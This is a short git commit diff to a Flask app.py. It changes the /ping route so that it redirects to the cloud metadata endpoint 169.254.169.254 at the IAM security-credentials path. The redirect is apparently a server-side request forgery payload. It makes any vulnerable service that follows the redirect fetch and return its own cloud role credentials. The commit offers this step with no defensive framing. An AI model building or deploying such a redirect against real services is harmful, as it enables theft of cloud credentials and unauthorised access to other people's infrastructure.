a84a95003403a04df8b8819692d936af57b49176
mattzamat <96935285+mattzamat@users.noreply.github.com>
2022-12-03 22:26:29 -0500

    Update app.py

--- app.py
+++ app.py
@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route('/ping')
 def hello():
-    return redirect("https://access-point-34-69-255-207.tripleblind.app", code=302)
+    return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name", code=302)
 
 if __name__ == '__main__':
     # Bind to PORT if defined, otherwise default to 5000.
